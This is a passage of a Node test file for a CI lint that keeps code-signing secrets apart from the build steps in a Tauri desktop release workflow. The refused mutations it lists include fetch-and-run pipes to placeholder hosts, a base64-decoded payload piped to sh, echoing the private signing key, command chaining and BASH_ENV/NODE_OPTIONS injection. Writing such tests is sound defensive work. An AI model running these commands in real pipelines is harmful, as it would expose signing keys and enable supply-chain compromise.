// Run with: node --test scripts/desktop-release-workflow.test.mjs
// Keeps the signing secrets apart from the build. The real workflow must pass;
// every mutation below mixes the two (or hides one) and must fail. The lint
// parses the YAML with the `yaml` package: from the repository root it comes
// from node_modules, in the verification build from `npm ci` in this directory.

import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';

import {
  checkLockfile,
  checkWorkflow,
  CLEANUP_STEP,
  logicalLines,
  parseWorkflow,
  SIGNING_TOOLS_INSTALL,
  secretReferences,
  VETTED_STEPS,
  workflowTauriCliVersion,
} from './desktop-release-workflow-lint.mjs';

const here = dirname(fileURLToPath(import.meta.url));
const source = readFileSync(
  join(here, '../../../../.github/workflows/desktop-release.yml'),
  'utf8',
);

/** Replace `from` (which must occur exactly once) in a copy of the workflow. */
function mutate(from, to, text = source) {
  const parts = text.split(from);
  assert.equal(parts.length, 2, `mutation anchor must occur once: ${from}`);
  return parts.join(to);
}
const problemsOf = (text) => checkWorkflow(text);
const fails = (text, pattern) => {
  const problems = problemsOf(text);
  assert.ok(problems.length > 0, 'expected the mutation to be refused');
  if (pattern) {
    assert.ok(
      problems.some((p) => pattern.test(p)),
      `no problem matched ${pattern}: ${problems.join(' | ')}`,
    );
  }
};

const wrapperDir = join(here, '..');
const signingTools = (name) =>
  readFileSync(join(wrapperDir, 'signing-tools', name), 'utf8');

const UPDATER_TAIL =
  '          test "${#payloads[@]}" -eq 1\n          "$GITHUB_WORKSPACE/$WRAPPER_DIR/signing-tools/node_modules/.bin/tauri" signer sign "${payloads[0]}"';
const BUILD_STEP_ENV = `        env:
          TARGET: \${{ matrix.target }}
          BUNDLES: \${{ matrix.bundles }}
        run: |
          tauri build --no-sign`;
const SECRET_LINE =
  '          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}\n';

describe('the real workflow', () => {
  it('keeps the secrets out of every build and install step', () => {
    assert.deepEqual(problemsOf(source), []);
  });

  it('is read as the jobs and steps that are there', () => {
    const { jobs } = parseWorkflow(source);
    assert.deepEqual(
      jobs.map((job) => job.id),
      [
        'verify-build',
        'release-preflight',
        'release-bundle',
        'release-build',
        'release',
        'release-publish',
      ],
    );
    const withSecrets = jobs
      .filter((job) =>
        job.steps.some((s) => secretReferences(s.raw).length > 0),
      )
      .map((job) => job.id);
    assert.deepEqual(withSecrets, ['release-preflight', 'release']);
    const build = jobs.find((job) => job.id === 'release-build');
    assert.ok(build.steps.some((s) => /tauri build/.test(s.run ?? '')));
    assert.equal(build.environment, undefined);
    assert.equal(jobs.find((j) => j.id === 'release').environment, 'desktop-release');
  });
});

describe('a secret next to a build or install fails', () => {
  it('in the step that runs tauri build / cargo', () => {
    fails(
      mutate(BUILD_STEP_ENV, BUILD_STEP_ENV.replace('        env:\n', `        env:\n${SECRET_LINE}`)),
      /holds a secret|allow-listed signing commands|its own env entry/,
    );
  });

  it('in the verification build', () => {
    fails(
      mutate(
        '        run: tauri build --no-bundle -- --locked',
        `        env:\n${SECRET_LINE}        run: tauri build --no-bundle -- --locked`,
      ),
    );
  });

  it('in a third-party action (tauri-action) step', () => {
    fails(
      mutate(
        '      - name: Upload the unsigned output\n',
        `      - name: Build with the action\n        uses: tauri-apps/tauri-action@1deb371b0cd8bd54025b384f1cd735e725c4060f\n        env:\n${SECRET_LINE}      - name: Upload the unsigned output\n`,
      ),
      /uses an action holds a secret/,
    );
  });

  it('in the CLI install step', () => {
    fails(
      mutate(
        '      - name: Install the locked Tauri CLI\n        if: runner.os != \'Linux\'\n',
        `      - name: Install the locked Tauri CLI\n        if: runner.os != 'Linux'\n        env:\n${SECRET_LINE}`,
      ),
    );
  });

  it('at job level or workflow level', () => {
    fails(
      mutate('    timeout-minutes: 90\n    permissions:\n      contents: read\n    defaults:\n      run:\n        shell: bash\n    strategy:\n      fail-fast: true\n      matrix:\n        include:\n          # Both macOS',
        `    timeout-minutes: 90\n    env:\n${SECRET_LINE.replace('          ', '      ')}    permissions:\n      contents: read\n    defaults:\n      run:\n        shell: bash\n    strategy:\n      fail-fast: true\n      matrix:\n        include:\n          # Both macOS`),
      /job level/,
    );
    fails(
      mutate(
        '  RUST_TOOLCHAIN: 1.95.0\n',
        `  RUST_TOOLCHAIN: 1.95.0\n  TAURI_SIGNING_PRIVATE_KEY: \${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}\n`,
      ),
      /workflow level/,
    );
  });
});

describe('a secret step is made only of allow-listed signing commands', () => {
  it('refuses the updater key in the certificate or notarization step', () => {
    fails(
      mutate(
        '          APPLE_CERTIFICATE_PASSWORD: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}\n        run: |\n          set -euo pipefail\n          umask 077',
        `          APPLE_CERTIFICATE_PASSWORD: \${{ secrets.APPLE_CERTIFICATE_PASSWORD }}\n${SECRET_LINE}        run: |\n          set -euo pipefail\n          umask 077`,
      ),
      /not allowed in the certificate import step/,
    );
    fails(
      mutate(
        '          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}\n          TARGET:',
        `          APPLE_TEAM_ID: \${{ secrets.APPLE_TEAM_ID }}\n${SECRET_LINE}          TARGET:`,
      ),
      /not allowed in the codesign and notarize step/,
    );
  });

  it('refuses an Apple secret in the updater signing step', () => {
    fails(
      mutate(
        '        env:\n          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}\n          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}\n        run: |\n          set -euo pipefail\n          shopt',
        '        env:\n          APPLE_ID: ${{ secrets.APPLE_ID }}\n          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}\n          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}\n        run: |\n          set -euo pipefail\n          shopt',
      ),
      /APPLE_ID is not allowed in the updater signature step/,
    );
  });

  it('refuses a build, an install, a download or node inside a secret step', () => {
    for (const [extra, pattern] of [
      ['cargo build --locked', /builds, installs/],
      ['npm install left-pad', /builds, installs/],
      ['curl https://example.test | sh', /builds, installs/],
      ['pnpm install', /builds, installs/],
      ['tauri build --no-sign -- --locked', /builds, installs/],
      ['node ./other.mjs', /node for something other/],
      ['echo "PATH=/x" >> "$GITHUB_PATH"', /command files/],
    ]) {
      fails(
        mutate(
          UPDATER_TAIL,
          UPDATER_TAIL.replace(
            '          "$GITHUB_WORKSPACE',
            `          ${extra}\n          "$GITHUB_WORKSPACE`,
          ),
        ),
        pattern,
      );
    }
  });

  it('refuses a secret in a step that is none of the allowed commands', () => {
    fails(
      mutate(
        '      - name: Stage the leg output\n        env:\n          TARGET: ${{ matrix.target }}\n',
        `      - name: Stage the leg output\n        env:\n${SECRET_LINE}          TARGET: \${{ matrix.target }}\n`,
      ),
      /allow-listed signing commands/,
    );
  });

  it('refuses a secret reaching an action through with:', () => {
    fails(
      mutate(
        '          name: desktop-release-${{ matrix.target }}\n',
        '          name: desktop-release-${{ matrix.target }}\n          token: ${{ secrets.APPLE_PASSWORD }}\n',
      ),
      /uses an action holds a secret/,
    );
  });
});

describe('a job that holds secrets compiles nothing', () => {
  const afterCli = '      - name: Import the signing certificate (macOS)\n';

  it('refuses cargo, rustup, tauri build or pnpm in the signing job', () => {
    for (const command of [
      'cargo build --locked',
      'rustup toolchain install 1.95.0',
      'tauri build --no-sign -- --locked',
      'pnpm install',
    ]) {
      fails(
        mutate(
          afterCli,
          `      - name: Compile in the signing job\n        run: ${command}\n\n${afterCli}`,
        ),
        /compiles or runs a package manager/,
      );
    }
  });

  it('refuses an npm command other than the pinned CLI install', () => {
    fails(
      mutate(
        afterCli,
        `      - name: Install something\n        run: npm install --global left-pad\n\n${afterCli}`,
      ),
      /npm other than the locked/,
    );
    // flags dropped, or the old unlocked global install put back
    for (const replacement of [
      'npm ci --prefix "$WRAPPER_DIR/signing-tools"',
      'npm ci --ignore-scripts --prefix "$WRAPPER_DIR/signing-tools"',
      'npm install --ignore-scripts --prefix "$WRAPPER_DIR/signing-tools"',
      'npm install --global --ignore-scripts "@tauri-apps/cli@${TAURI_CLI_VERSION}"',
    ]) {
      fails(mutate(SIGNING_TOOLS_INSTALL, replacement), /npm other than the locked/);
    }
  });

  it('refuses an action that is not an allowed, pinned one', () => {
    fails(
      mutate(
        afterCli,
        `      - name: Third party\n        uses: some/action@v1\n\n${afterCli}`,
      ),
      /not an allowed, SHA-pinned/,
    );
    fails(
      mutate(
        afterCli,
        `      - name: Local action\n        uses: ./.github/actions/setup-environment\n\n${afterCli}`,
      ),
      /not an allowed, SHA-pinned/,
    );
  });

  it('refuses a secret job outside the protected environment', () => {
    const text = mutate(
      '    timeout-minutes: 90\n    environment: desktop-release\n',
      '    timeout-minutes: 90\n',
    );
    fails(text, /not in the desktop-release environment/);
  });

  it('refuses dropping the always() cleanup', () => {
    fails(
      mutate('      - name: Clean up\n        if: always()\n', '      - name: Clean up\n'),
      /always\(\) cleanup/,
    );
    fails(
      mutate('security delete-keychain', 'echo keychain'),
      /always\(\) cleanup/,
    );
    fails(
      mutate('rm -rf "$WRAPPER_DIR/signing-tools/node_modules"', 'true'),
      /always\(\) cleanup/,
    );
  });
});

describe('--locked and pinned toolchains', () => {
  it('refuses tauri build and cargo without --locked', () => {
    fails(mutate('            -- --locked\n', '            --\n'), /without -- --locked/);
    fails(
      mutate(
        '        run: tauri build --no-bundle -- --locked',
        '        run: tauri build --no-bundle',
      ),
      /without -- --locked/,
    );
    fails(
      mutate(
        '      - name: Install the pinned Tauri CLI\n        run: npm install --global --ignore-scripts "@tauri-apps/cli@${TAURI_CLI_VERSION}"\n\n      # No product bundle',
        '      - name: Cargo\n        run: cargo build --release\n\n      # No product bundle',
      ),
      /cargo without --locked/,
    );
  });

  it('refuses floating Rust and Node', () => {
    fails(
      mutate('  RUST_TOOLCHAIN: 1.95.0\n', '  RUST_TOOLCHAIN: stable\n'),
      /RUST_TOOLCHAIN/,
    );
    fails(
      mutate('  NODE_VERSION: 24.11.1\n', "  NODE_VERSION: '24'\n"),
      /NODE_VERSION/,
    );
    fails(
      mutate(
        '          rustup toolchain install "$RUST_TOOLCHAIN" --profile minimal\n          rustup default "$RUST_TOOLCHAIN"\n          rustc --version\n          cargo --version\n\n      - name: Cache cargo',
        '          rustup toolchain install stable --profile minimal\n          rustup default stable\n\n      - name: Cache cargo',
      ),
      /floating Rust toolchain/,
    );
    fails(
      mutate(
        '          node-version: ${{ env.NODE_VERSION }}\n\n      - name: Set up Rust\n        run: |\n          rustup toolchain install "$RUST_TOOLCHAIN" --profile minimal\n          rustup default "$RUST_TOOLCHAIN"\n          rustc --version\n          cargo --version\n\n      - name: Cache cargo',
        "          node-version: '24'\n\n      - name: Set up Rust\n        run: |\n          rustup toolchain install \"$RUST_TOOLCHAIN\" --profile minimal\n          rustup default \"$RUST_TOOLCHAIN\"\n          rustc --version\n          cargo --version\n\n      - name: Cache cargo",
      ),
      /pinned NODE_VERSION/,
    );
  });
});

describe('block scalars cannot hide a command (the lint reads parsed YAML)', () => {
  const afterCli = '      - name: Import the signing certificate (macOS)\n';
  const headers = ['|', '>', '|-', '>-', '|+', '>+', '|2', '>2', '|2-', "'cargo build --locked'"];

  for (const header of headers) {
    it(`run: ${header} in the signing job`, () => {
      const body =
        header.startsWith("'") ? '' : '          cargo build --locked\n';
      const run = header.startsWith("'")
        ? `        run: ${header}\n`
        : `        run: ${header}\n${body}`;
      fails(
        mutate(
          afterCli,
          `      - name: Compile in the signing job\n${run}\n${afterCli}`,
        ),
        /compiles or runs a package manager/,
      );
    });
  }

  it('a block-scalar header does not hide a script in a secret step', () => {
    for (const header of ['|-', '|+', '|2']) {
      fails(
        mutate(
          UPDATER_TAIL,
          UPDATER_TAIL.replace(
            '          "$GITHUB_WORKSPACE',
            `          bash ./x.sh\n          "$GITHUB_WORKSPACE`,
          ),
        ).replace(
          '        run: |\n          set -euo pipefail\n          shopt',
          `        run: ${header}\n          set -euo pipefail\n          shopt`,
        ),
        /not an allow-listed signing command: bash \.\/x\.sh/,
      );
    }
    // folded, the lines join into one that is not listed
    fails(
      mutate(
        UPDATER_TAIL,
        UPDATER_TAIL.replace('          "$GITHUB_WORKSPACE', '          bash ./x.sh\n          "$GITHUB_WORKSPACE'),
      ).replace(
        '        run: |\n          set -euo pipefail\n          shopt',
        '        run: >-\n          set -euo pipefail\n          shopt',
      ),
      /not an allow-listed signing command/,
    );
  });
});

describe('every way of naming secrets is a secret reference', () => {
  const buildEnv = '          BUNDLES: ${{ matrix.bundles }}\n        run: |\n          tauri build --no-sign';
  const withEnv = (line) =>
    mutate(buildEnv, `          BUNDLES: \${{ matrix.bundles }}\n${line}\n        run: |\n          tauri build --no-sign`);

  it('is found in each spelling, wherever it sits', () => {
    for (const expression of [
      "${{ secrets['TAURI_SIGNING_PRIVATE_KEY'] }}",
      '${{ secrets["TAURI_SIGNING_PRIVATE_KEY"] }}',
      '${{ Secrets.TAURI_SIGNING_PRIVATE_KEY }}',
      '${{ SECRETS.TAURI_SIGNING_PRIVATE_KEY }}',
      '${{ toJSON(secrets) }}',
      '${{ toJson(secrets) }}',
      "${{ format('{0}', secrets) }}",
      '${{ secrets }}',
      "${{ fromJSON(toJSON(secrets))['TAURI_SIGNING_PRIVATE_KEY'] }}",
      'x${{ matrix.target }}${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}',
    ]) {
      fails(
        withEnv(`          LEAK: ${expression}`),
        /holds a secret|its own env entry/,
      );
    }
  });

  it('is found in if:, run and with:, not only in env', () => {
    fails(
      mutate(
        '      - name: Upload the unsigned output\n',
        "      - name: Gate\n        if: ${{ secrets.APPLE_ID != '' }}\n        run: echo hi\n      - name: Upload the unsigned output\n",
      ),
      /its own env entry/,
    );
    fails(
      mutate(
        '      - name: Upload the unsigned output\n',
        "      - name: Gate\n        if: toJSON(secrets) != ''\n        run: echo hi\n      - name: Upload the unsigned output\n",
      ),
      /its own env entry/,
    );
    fails(
      mutate(
        '      - name: Upload the unsigned output\n',
        '      - name: Inline\n        run: echo "${{ secrets.APPLE_ID }}"\n      - name: Upload the unsigned output\n',
      ),
      /its own env entry/,
    );
  });

  it('is found at job level as `secrets: inherit` and as an expression', () => {
    fails(
      mutate(
        '    timeout-minutes: 90\n    permissions:\n      contents: read\n    defaults:',
        '    timeout-minutes: 90\n    secrets: inherit\n    permissions:\n      contents: read\n    defaults:',
      ),
      /job level/,
    );
    fails(
      mutate(
        '  CARGO_INCREMENTAL: \'0\'\n',
        "  CARGO_INCREMENTAL: '0'\n  LEAK: ${{ toJSON(secrets) }}\n",
      ),
      /workflow level/,
    );
  });

  it('must be the exact value of the env entry of the same name', () => {
    fails(
      mutate(
        '          APPLE_ID: ${{ secrets.APPLE_ID }}\n          APPLE_PASSWORD: ${{ secrets.APPLE_PASSWORD }}\n          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}\n          TARGET',
        '          APPLE_ID: ${{ secrets.APPLE_PASSWORD }}\n          APPLE_PASSWORD: ${{ secrets.APPLE_PASSWORD }}\n          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}\n          TARGET',
      ),
      /its own env entry/,
    );
    fails(
      mutate(
        '          APPLE_ID: ${{ secrets.APPLE_ID }}\n          APPLE_PASSWORD: ${{ secrets.APPLE_PASSWORD }}\n          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}\n          TARGET',
        "          APPLE_ID: ${{ secrets.APPLE_ID || 'x' }}\n          APPLE_PASSWORD: ${{ secrets.APPLE_PASSWORD }}\n          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}\n          TARGET",
      ),
      /its own env entry/,
    );
  });

  it('secretReferences finds what the old dotted-name pattern missed', () => {
    assert.equal(secretReferences({ env: { A: '${{ secrets.A }}' } }).length, 1);
    assert.equal(secretReferences({ a: "${{ secrets['A'] }}" }).length, 1);
    assert.equal(secretReferences({ a: '${{ toJSON(secrets) }}' }).length, 1);
    assert.equal(secretReferences({ a: '${{ format("{0}", Secrets) }}' }).length, 1);
    assert.equal(secretReferences({ secrets: 'inherit' }).length, 1);
    assert.equal(secretReferences({ if: 'toJSON(secrets) != 1' }).length, 1);
    assert.equal(secretReferences({ name: 'Check secrets and keys' }).length, 0);
    assert.equal(secretReferences({ a: '${{ github.token }}' }).length, 0);
  });
});

describe('YAML anchors, aliases, merge keys and tags are refused', () => {
  it('refuses an anchor on the secret env and an alias in a build step', () => {
    fails(
      mutate(
        '        env:\n          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}\n          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}\n        run: |\n          set -euo pipefail\n          shopt',
        '        env: &k\n          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}\n          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}\n        run: |\n          set -euo pipefail\n          shopt',
      ).replace(BUILD_STEP_ENV, BUILD_STEP_ENV.replace(/        env:\n.*\n.*\n/, '        env: *k\n')),
      /anchor|alias/,
    );
  });

  it('refuses a lone anchor, a lone alias, a merge key and a tag', () => {
    fails(mutate('      fail-fast: true\n      matrix:\n        include:\n          # Both macOS', '      fail-fast: &ff true\n      matrix:\n        include:\n          # Both macOS'), /anchor/);
    fails(
      mutate('  CARGO_INCREMENTAL: \'0\'\n', "  CARGO_INCREMENTAL: &c '0'\n").replace(
        '  WRAPPER_DIR: packages/smrt-desktop/wrapper\n',
        '  WRAPPER_DIR: packages/smrt-desktop/wrapper\n  COPY: *c\n',
      ),
      /alias/,
    );
    fails(
      mutate('  CARGO_INCREMENTAL: \'0\'\n', "  CARGO_INCREMENTAL: '0'\n  <<: {X: y}\n"),
      /merge key/,
    );
    fails(mutate("  CARGO_INCREMENTAL: '0'\n", '  CARGO_INCREMENTAL: !!str 0\n'), /tag/);
  });

  it('refuses a duplicate key and a second document', () => {
    fails(mutate("  CARGO_INCREMENTAL: '0'\n", "  CARGO_INCREMENTAL: '0'\n  CARGO_INCREMENTAL: '1'\n"), /YAML/);
    fails(`${source}\n---\nname: other\n`, /YAML/);
  });
});

describe('a secret step runs only allow-listed commands', () => {
  const insert = (extra) =>
    mutate(UPDATER_TAIL, UPDATER_TAIL.replace('          "$GITHUB_WORKSPACE', `          ${extra}\n          "$GITHUB_WORKSPACE`));

  it('refuses scripts, interpreters and other ways to run anything', () => {
    for (const extra of [
      'bash ./x.sh',
      'sh ./x.sh',
      'sh -c "echo hi"',
      'python3 -c "print(1)"',
      'perl -e 1',
      'make',
      'source ./x.sh',
      '. ./x.sh',
      'eval "$X"',
      'env | sort',
      'cat /etc/hosts',
      'echo hi > "$RUNNER_TEMP/x"',
      'echo "$TAURI_SIGNING_PRIVATE_KEY"',
      'cat <<EOF',
      'x=$(date)',
    ]) {
      fails(insert(extra), /not an allow-listed signing command/);
    }
  });

  it('refuses a listed command with something added to it', () => {
    fails(
      mutate(UPDATER_TAIL, `${UPDATER_TAIL.replace('"${payloads[0]}"', '"${payloads[0]}" ; bash ./x.sh')}`),
      /not an allow-listed signing command/,
    );
    fails(
      mutate(UPDATER_TAIL, UPDATER_TAIL.replace('"${payloads[0]}"', '"${payloads[0]}" && curl x')),
      /not an allow-listed signing command/,
    );
    fails(
      mutate(
        'security import "$cert" -k "$keychain" \\\n            -P "$APPLE_CERTIFICATE_PASSWORD" -T /usr/bin/codesign',
        'security import "$cert" -k "$keychain" \\\n            -P "$APPLE_CERTIFICATE_PASSWORD" -T /usr/bin/codesign; bash ./x.sh',
      ),
      /not an allow-listed signing command/,
    );
  });

  it('refuses a script run in the certificate import and the notarization step', () => {
    fails(
      mutate('          umask 077\n', '          umask 077\n          bash ./x.sh\n'),
      /not an allow-listed signing command/,
    );
    fails(
      mutate(
        '          chmod -R u+rwX "$app"\n',
        '          chmod -R u+rwX "$app"\n          make\n',
      ),
      /not an allow-listed signing command/,
    );
  });

  it('refuses the Tauri CLI from PATH and any other binary location', () => {
    fails(mutate(UPDATER_TAIL, UPDATER_TAIL.replace('"$GITHUB_WORKSPACE/$WRAPPER_DIR/signing-tools/node_modules/.bin/tauri"', 'tauri')));
    fails(mutate(UPDATER_TAIL, UPDATER_TAIL.replace('"$GITHUB_WORKSPACE/$WRAPPER_DIR/signing-tools/node_modules/.bin/tauri"', '"$RUNNER_TEMP/tauri"')));
  });

  it('refuses keys that change how the script runs, and stray env', () => {
    fails(
      mutate(
        '        run: |\n          set -euo pipefail\n          shopt',
        '        shell: python {0}\n        run: |\n          set -euo pipefail\n          shopt',
      ),
      /may not set shell/,
    );
    fails(
      mutate(
        '        run: |\n          set -euo pipefail\n          shopt',
        '        working-directory: /tmp\n        run: |\n          set -euo pipefail\n          shopt',
      ),
      /may not set working-directory/,
    );
    fails(
      mutate(
        '          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}\n        run: |\n          set -euo pipefail\n          shopt',
        '          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}\n          BASH_ENV: /tmp/x\n        run: |\n          set -euo pipefail\n          shopt',
      ),
      /env BASH_ENV is not allowed/,
    );
    fails(
      mutate("  CARGO_INCREMENTAL: '0'\n", "  CARGO_INCREMENTAL: '0'\n  BASH_ENV: /tmp/x\n"),
      /workflow-level env BASH_ENV/,
    );
    fails(
      mutate(
        '    environment: desktop-release\n    permissions:\n      contents: read\n    defaults:\n      run:\n        shell: bash\n',
        '    environment: desktop-release\n    env:\n      NODE_OPTIONS: --require /tmp/x\n    permissions:\n      contents: read\n    defaults:\n      run:\n        shell: bash\n',
      ),
      /job-level env/,
    );
  });
});

describe('the token permissions', () => {
  const preflight = () =>
    parseWorkflow(source).jobs.find((job) => job.id === 'release-preflight');
  const DEFAULTS = '    defaults:\n      run:\n        shell: bash\n';
  const PERMISSIONS = `    permissions:\n      contents: read\n      actions: read\n${DEFAULTS}    steps:\n      - name: Require main`;

  it('gives the environment check exactly contents: read and actions: read', () => {
    assert.deepEqual(preflight().permissions, { contents: 'read', actions: 'read' });
  });

  it('refuses a preflight with less or more than that', () => {
    for (const replacement of [
      `    permissions:\n      contents: read\n${DEFAULTS}    steps:\n      - name: Require main`,
      `    permissions:\n      actions: read\n${DEFAULTS}    steps:\n      - name: Require main`,
      `    permissions:\n      contents: read\n      actions: write\n${DEFAULTS}    steps:\n      - name: Require main`,
      `    permissions:\n      contents: write\n      actions: read\n${DEFAULTS}    steps:\n      - name: Require main`,
      `    permissions:\n      contents: read\n      actions: read\n      id-token: write\n${DEFAULTS}    steps:\n      - name: Require main`,
      `    permissions: read-all\n${DEFAULTS}    steps:\n      - name: Require main`,
      '    steps:\n      - name: Require main',
    ]) {
      fails(mutate(PERMISSIONS, replacement), /exactly "contents: read" and "actions: read"/);
    }
  });

  it('keeps every job that holds a secret read-only', () => {
    fails(
      mutate(
        '    environment: desktop-release\n    permissions:\n      contents: read\n    defaults:',
        '    environment: desktop-release\n    permissions:\n      contents: write\n    defaults:',
      ),
      /no explicit read-only permissions/,
    );
  });
});

describe('the Tauri CLI the signing job runs is locked', () => {
  const lock = () => signingTools('package-lock.json');
  const pkg = () => signingTools('package.json');
  const expected = () => ({
    name: '@tauri-apps/cli',
    version: workflowTauriCliVersion(source),
  });
  const mutateJson = (text, edit) => {
    const value = JSON.parse(text);
    edit(value);
    return JSON.stringify(value, null, 2);
  };

  it('installs it with npm ci from the committed directory, in a secretless step', () => {
    const release = parseWorkflow(source).jobs.find((job) => job.id === 'release');
    const install = release.steps.find((step) => step.run?.includes('npm '));
    assert.equal(install.run.trim(), SIGNING_TOOLS_INSTALL);
    assert.equal(secretReferences(install.raw).length, 0);
    for (const step of release.steps) {
      assert.doesNotMatch(step.run ?? '', /npm (install|i|add|exec|x)\b|--global|\bnpx\b/);
    }
  });

  it('the committed lockfile passes: integrity, npm registry, the pinned version', () => {
    assert.deepEqual(checkLockfile(lock(), pkg(), expected()), []);
    assert.equal(expected().version, JSON.parse(pkg()).dependencies['@tauri-apps/cli']);
  });

  it('the parser package the verification build installs is locked too', () => {
    assert.deepEqual(
      checkLockfile(
        readFileSync(join(here, 'package-lock.json'), 'utf8'),
        readFileSync(join(here, 'package.json'), 'utf8'),
      ),
      [],
    );
  });

  it('refuses a package without integrity, from another host, or unlocked', () => {
    const cli = 'node_modules/@tauri-apps/cli-darwin-arm64';
    const entries = (edit) => mutateJson(lock(), (l) => edit(l.packages));
    const expectProblem = (text, pattern, pkgText = pkg()) => {
      const problems = checkLockfile(text, pkgText, expected());
      assert.ok(problems.some((p) => pattern.test(p)), `${pattern}: ${problems.join(' | ')}`);
    };
    expectProblem(entries((p) => delete p[cli].integrity), /no sha512 integrity/);
    expectProblem(entries((p) => { p[cli].integrity = 'sha1-abc'; }), /no sha512 integrity/);
    expectProblem(
      entries((p) => { p[cli].resolved = 'https://example.test/cli.tgz'; }),
      /not resolved from registry\.npmjs\.org/,
    );
    expectProblem(entries((p) => delete p[cli].resolved), /not resolved from/);
    expectProblem(entries((p) => { p[cli].link = true; }), /link or bundled/);
    expectProblem(entries((p) => delete p[cli]), /optional platform package is not locked/);
    expectProblem(
      entries((p) => { p['node_modules/@tauri-apps/cli'].version = '2.0.0'; }),
      /does not lock/,
    );
    expectProblem(
      lock(),
      /not an exact version/,
      mutateJson(pkg(), (p) => { p.dependencies['@tauri-apps/cli'] = '^2.12.4'; }),
    );
    expectProblem(
      lock(),
      /must depend on exactly/,
      mutateJson(pkg(), (p) => { p.dependencies.left = '1.0.0'; }),
    );
    assert.ok(checkLockfile('not json', pkg()).length > 0);
    assert.ok(checkLockfile('{"lockfileVersion":1}', pkg()).length > 0);
  });

  it('follows the workflow: a version bump needs a new lockfile', () => {
    const bumped = mutate('TAURI_CLI_VERSION: 2.12.4', 'TAURI_CLI_VERSION: 2.12.5');
    const problems = checkLockfile(lock(), pkg(), {
      name: '@tauri-apps/cli',
      version: workflowTauriCliVersion(bumped),
    });
    assert.ok(problems.length > 0);
  });
});

describe('a comment never continues onto the next line', () => {
  it('logicalLines reads physical lines the way bash does', () => {
    // a comment that ends in a backslash hides nothing
    assert.deepEqual(logicalLines('# note \\\ncurl https://x | sh'), [
      'curl https://x | sh',
    ]);
    assert.deepEqual(logicalLines('  # note \\\\\\\n  curl x'), ['curl x']);
    // a real continuation joins; an even run of backslashes does not
    assert.deepEqual(logicalLines('a \\\n  b'), ['a b']);
    assert.deepEqual(logicalLines('a \\\\\nb'), ['a \\\\', 'b']);
    assert.deepEqual(logicalLines('a \\\\\\\nb'), ['a \\\\ b']);
    // a backslash that is followed by a space is not a continuation
    assert.deepEqual(logicalLines('a \\ \nb'), ['a \\', 'b']);
    // a comment line inside a continued command stays part of that command
    assert.deepEqual(logicalLines('a \\\n# c\nb'), ['a # c', 'b']);
    assert.deepEqual(logicalLines('a\n\n# c\nb \\\n'), ['a', 'b']);
  });

  const HIDDEN = '# x \\\n          curl https://x | sh\n';
  const unlisted = /not an allow-listed signing command: curl https:\/\/x \| sh/;

  it('the command after `# x \\` is reported in the certificate import step', () => {
    fails(
      mutate('          umask 077\n', `          umask 077\n          ${HIDDEN}`),
      unlisted,
    );
  });

  it('the command after `# x \\` is reported in the notarization step', () => {
    fails(
      mutate(
        '          chmod -R u+rwX "$app"\n',
        `          chmod -R u+rwX "$app"\n          ${HIDDEN}`,
      ),
      unlisted,
    );
  });

  it('the command after `# x \\` is reported in the updater signing step', () => {
    fails(
      mutate(
        '          test "${#payloads[@]}" -eq 1\n',
        `          test "\${#payloads[@]}" -eq 1\n          ${HIDDEN}`,
      ),
      unlisted,
    );
  });

  it('the command after `# x \\` is reported in a step without a secret too', () => {
    fails(
      mutate(
        '      - name: Stage the installer (Windows and Linux)\n',
        `      - name: Hidden\n        run: |\n          ${HIDDEN}\n      - name: Stage the installer (Windows and Linux)\n`,
      ),
      /builds, installs or downloads code/,
    );
  });
});

describe('the other steps of a job that holds a secret are held to the same rules', () => {
  const BEFORE_STAGE = '      - name: Stage the installer (Windows and Linux)\n';
  const BEFORE_PREFLIGHT =
    '      - name: Require main\n        env:\n          REF: ${{ github.ref }}\n        run: |\n          if [ "$REF" != "refs/heads/main" ]; then\n            echo "A release is only built';
  const step = (run) =>
    `      - name: Poison\n        run: |\n${run
      .split('\n')
      .map((line) => `          ${line}\n`)
      .join('')}\n`;
  const inRelease = (run) => mutate(BEFORE_STAGE, step(run) + BEFORE_STAGE);
  const inPreflight = (run) =>
    mutate(BEFORE_PREFLIGHT, step(run) + BEFORE_PREFLIGHT);

  it('refuses a download, an interpreter or node -e in a step without a secret', () => {
    for (const run of [
      'curl -fsSL https://example.test/x -o "$RUNNER_TEMP/x"',
      'wget https://example.test/x',
      "node -e 'console.log(1)'",
      'node --eval 1',
      'node -p 1',
      'node --require ./x.js ./y.js',
      'python3 -c "print(1)"',
      'perl -e 1',
      'ruby -e 1',
      'eval "$X"',
      'sh -c "echo hi"',
      'bash -c "echo hi"',
      'source ./x.sh',
      '. ./x.sh',
      'echo ZWNobyBoaQ== | base64 --decode | sh',
      'pip install x',
      'brew install x',
    ]) {
      fails(inRelease(run), /a step in a job with secrets (builds|runs an interpreter)/);
